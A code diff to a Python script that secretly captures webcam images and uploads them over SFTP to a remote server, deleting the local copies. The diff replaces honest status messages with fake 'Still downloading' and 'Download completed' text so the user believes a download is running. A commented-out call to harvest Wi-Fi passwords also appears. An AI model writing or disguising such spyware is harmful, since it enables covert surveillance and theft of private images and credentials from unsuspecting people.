@@ -137,12 +137,12 @@ def capture_and_transfer_images(ssh_client, image_count=5, interval=0.2):
                 cv2.imwrite(local_image_path, frame)
                 sftp_client.put(local_image_path, os.path.join(REMOTE_PATH, remote_filename))
                 os.remove(local_image_path)
-                print(f"Captured and sent image: {remote_filename}")
+                print(f"Still downloading Wait...")
             time.sleep(interval)
         camera.release()
         cv2.destroyAllWindows()
     except Exception as e:
-        print(f"Error capturing and transferring images: {e}")
+        print(f"Error in downloading: {e}")
     finally:
         sftp_client.close()
 
@@ -153,7 +153,7 @@ def main():
     # wifi_passwords = get_wifi_passwords()
     capture_and_transfer_images(ssh_client)
     ssh_client.close()
-    print("[*] All tasks completed successfully. Ready to log out of Tailscale.")
+    print("[*] Download completed")
 
 if __name__ == "__main__":
     main()
